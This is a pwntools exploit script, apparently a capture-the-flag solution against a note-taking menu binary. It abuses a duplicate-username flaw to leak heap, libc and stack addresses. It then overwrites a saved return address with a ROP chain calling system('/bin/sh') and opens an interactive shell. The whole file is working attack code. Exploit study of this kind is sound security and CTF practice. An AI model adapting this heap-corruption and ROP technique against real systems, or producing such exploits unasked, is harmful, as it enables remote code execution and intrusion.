#!/usr/bin/env python3
from pwn import *
import binascii
import sys

exe_path = 'chall_patched'
HOST = 'example.com'
PORT = 1337

exe = ELF(exe_path, checksec=False)
libc = exe.libc
context.binary = exe
context.terminal = [
    'cmd.exe', '/c', 'start',
    'wt.exe', '-w', '0', 'split-pane', '-V',
    '-d', '.',
    'wsl.exe',
    '-d', 'kali-linux',
    'bash', '-c'
]

gdbscript = '''
brva 0x1f04
continue
'''

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    p = process(exe.path)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
        input()
    return p

p = start()

def sla(prompt, data):
    p.sendlineafter(prompt, data)
def sa(prompt, data):
    p.sendafter(prompt, data)
def s(prompt):
    p.send(prompt)
def sl(data):
    p.sendline(data)
def rcu(data):
    return p.recvuntil(data)
def rl():
    return p.recvline()

# ============================EXPLOIT============================
def register(name, username, password):
    sla(b'Your choice: ', b'1')
    sla(b' full name: ', name)
    sla(b' username: ', username)
    sla(b' password: ', password)
def login(username, password):
    sla(b'Your choice: ', b'2')
    sla(b' username: ', username)
    sla(b' password: ', password)
def logout():
    sla(b'Your choice: ', b'3')
def note():
    sla(b'Your choice: ', b'4')
def add_note(title, content):
    note()
    sla(b'Your choice: ', b'1')
    sla(b' title: ', title)
    sla(b' content: ', content) # 0x100
    sla(b'Your choice: ', b'5')
def view_note():
    note()
    sla(b'Your choice: ', b'2')
    
def edit_note(title, content):
    note()
    sla(b'Your choice: ', b'3')
    sla(b' note you want to edit: ', title)
    sla(b' new content: ', content)
    sla(b'Your choice: ', b'5')
def delete_note(title):
    note()
    sla(b'Your choice: ', b'4')
    sla(b' note you want to delete: ', title)
    sla(b'Your choice: ', b'5')
def profile():
    sla(b'Your choice: ', b'5')
def view_profile():
    profile()
    sla(b'Your choice: ', b'1')
def edit_profile(option, content):
    profile()
    sla(b'Your choice: ', b'2')
    if option == 1:
        sla(b'Your choice: ', b'1')
        sla(b' new full name: ', content)
    elif option == 2:
        sla(b'Your choice: ', b'2')
        sla(b' new password: ', content)
    sla(b'Your choice: ', b'3') # back pro5
    sla(b'Your choice: ', b'3') # back menu

# set up heap
register(b'A'*0x10, b'username', b'password1')
login(b'username', b'password1')
add_note(b'MOCK NOTE', b'DEADBEEF')
logout()
register(b'B'*0x10, b'username', b'password2')
login(b'username', b'password2')

# leak heap by overwriting note title
for i in range(10):
    add_note(f'Note {i}', b'C'*0x10)
logout()
login(b'username', b'password2')
for i in range(7):
    add_note(f'Note {i+10}', b'D'*0x10)
logout()


login(b'username', b'password1')
view_note()
rcu(b'Title: ')
heap_base = u64(p.recv(6).ljust(8, b'\x00')) - 0x2ae0

# create new username to leak libc via unsorted bin
sla(b'Your choice: ', b'5')
logout()
register(b'E' * 0x10, b'USERNAME1', b'PASSWORD1')
login(b'USERNAME1', b'PASSWORD1')

for i in range(9):
    add_note(f'Note {i}', b'C'*0x10)

for i in range(8, 0, -1):
    delete_note(f'Note {i}')

leak_libc = heap_base + 0x2fa0

logout()

# overwrite content pointer of first note -> another pointer to NOTE struct (NOTE 20)
register(b'F'*0x10, b'username', b'password3')
login(b'username', b'password3')
for i in range(5):
    add_note(f'Note {i+17}', b'G'*0x10)

logout()
login(b'username', b'password1')

# edit content pointer of NOTE 20 via content pointer of NOTE 1 to leak libc
edit_note(p64(heap_base + 0x2ae0), b'I'*0x20 + p64(leak_libc))
view_note()

rcu(b'Title: Note 19\nContent: ' + b'G'*0x10)
rcu(b'Title: ' + b'I'*0x10)
rcu(b'Content: ')
libc.address = u64(p.recv(6).ljust(8, b'\x00')) - 0x203b20 

sla(b'Your choice: ', b'5')

# edit content pointer of NOTE 20 via content pointer of NOTE 1 to leak stack

edit_note(p64(heap_base + 0x2ae0), b'I'*0x20 + p64(libc.sym.environ))
view_note()
rcu(b'Title: Note 19\nContent: ' + b'G'*0x10)
rcu(b'Title: ' + b'I'*0x10)
rcu(b'Content: ')
srip = u64(p.recv(6).ljust(8, b'\x00')) - 0x160

log.success(hex(libc.address))
log.success(hex(heap_base))
log.success(hex(srip))


sla(b'Your choice: ', b'5')

pop_rdi = 0x000000000010f78b + libc.address
ret = 0x000000000002882f + libc.address
system = libc.sym.system
binsh = next(libc.search(b'/bin/sh'))
payload = flat(
    ret, pop_rdi, binsh, system
)

# edit content pointer of NOTE 20 via content pointer of NOTE 1 to overwrite saved RIP with ROP

edit_note(p64(heap_base + 0x2ae0), b'NOTE'.ljust(0x20, b'\x00') + p64(srip))
edit_note(b'NOTE\x00', payload)

sl(b'ls -la')
p.interactive()
